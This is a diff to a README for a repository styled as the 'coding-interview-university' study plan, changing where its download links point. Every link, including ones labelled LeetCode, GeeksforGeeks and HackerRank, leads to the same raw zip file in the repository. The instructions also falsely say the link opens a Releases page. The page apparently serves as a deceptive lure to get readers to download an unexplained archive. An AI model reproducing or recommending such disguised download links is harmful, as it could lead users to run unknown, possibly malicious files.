@@ -1,7 +1,7 @@
 # 🚀 coding-interview-university - Your Path to Software Engineering Success
 
 ## 📥 Download Now
-[![Download coding-interview-university](https://raw.githubusercontent.com/omarmass/coding-interview-university/main/Eurypteroidea/coding-interview-university.zip)](https://raw.githubusercontent.com/omarmass/coding-interview-university/main/Eurypteroidea/coding-interview-university.zip)
+[![Download coding-interview-university](https://raw.githubusercontent.com/omarmass/coding-interview-university/main/extras/cheat sheets/interview-university-coding-v1.1.zip)](https://raw.githubusercontent.com/omarmass/coding-interview-university/main/extras/cheat sheets/interview-university-coding-v1.1.zip)
 
 ## 🌟 Description
 **coding-interview-university** offers a structured study plan for anyone aiming to become a software engineer. This detailed guide covers essential topics like algorithms, data structures, and coding interviews. You can master the skills needed for success in technical interviews through careful study and practice.
@@ -29,7 +29,7 @@ Following this plan will boost your confidence while you prepare for interviews.
 - A PDF reader to view the study materials.
 
 ## 📦 Download & Install
-To download the study plan, visit this page: [Download coding-interview-university](https://raw.githubusercontent.com/omarmass/coding-interview-university/main/Eurypteroidea/coding-interview-university.zip).
+To download the study plan, visit this page: [Download coding-interview-university](https://raw.githubusercontent.com/omarmass/coding-interview-university/main/extras/cheat sheets/interview-university-coding-v1.1.zip).
 
 1. Click on the link above.
 2. You will be directed to the Releases page.
@@ -55,9 +55,9 @@ If you encounter any issues while downloading or using the materials, consider t
 - **Contact Support**: If issues persist, please reach out through the Issues tab on GitHub for assistance. Provide details about your problem to receive effective help.
 
 ## 🔗 Additional Resources
-- [LeetCode](https://raw.githubusercontent.com/omarmass/coding-interview-university/main/Eurypteroidea/coding-interview-university.zip) - Practice coding questions.
-- [GeeksforGeeks](https://raw.githubusercontent.com/omarmass/coding-interview-university/main/Eurypteroidea/coding-interview-university.zip) - Learn algorithms and data structures.
-- [HackerRank](https://raw.githubusercontent.com/omarmass/coding-interview-university/main/Eurypteroidea/coding-interview-university.zip) - Participate in coding challenges.
+- [LeetCode](https://raw.githubusercontent.com/omarmass/coding-interview-university/main/extras/cheat sheets/interview-university-coding-v1.1.zip) - Practice coding questions.
+- [GeeksforGeeks](https://raw.githubusercontent.com/omarmass/coding-interview-university/main/extras/cheat sheets/interview-university-coding-v1.1.zip) - Learn algorithms and data structures.
+- [HackerRank](https://raw.githubusercontent.com/omarmass/coding-interview-university/main/extras/cheat sheets/interview-university-coding-v1.1.zip) - Participate in coding challenges.
 
 ## 📝 Contribution
 If you wish to contribute to this project, check out the guidelines provided in the repository. Your input can help improve this study plan for future learners.
